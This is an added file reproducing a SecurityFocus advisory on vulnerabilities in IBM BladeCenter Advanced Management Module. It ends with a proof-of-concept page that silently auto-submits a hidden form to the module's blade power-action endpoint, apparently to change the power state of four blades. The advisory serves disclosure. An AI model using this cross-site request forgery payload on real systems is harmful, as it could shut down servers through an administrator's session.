@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/34447/info
+  
+IBM BladeCenter Advanced Management Module is prone to the following remote vulnerabilities:
+  
+- An HTML-injection vulnerability
+- A cross-site scripting vulnerability
+- An information-disclosure vulnerability
+- Multiple cross-site request-forgery vulnerabilities
+  
+An attacker can exploit these issues to obtain sensitive information, execute arbitrary script code, steal cookie-based authentication credentials, and perform actions as an authenticated user of the application. Other attacks are also possible.
+  
+Versions prior to BladeCenter Advanced Management Module 1.42U are vulnerable. 
+
+<html> <body onload="document.foobar.submit()"> <form name="foobar" method="post" action="http://example.com/private/blade_power_action" style="display:none"> <input name="COMMAND" value="6.3.2"> <input name="STATE" value="0"> <input name="CHECKED" value="15"> <input name="selall" value="on"> <input name="sel" value="bl1"> <input name="sel" value="bl2"> <input name="sel" value="bl3"> <input name="sel" value="bl4"> <input name="JUNK" value="1"> </form> <body> </html> 
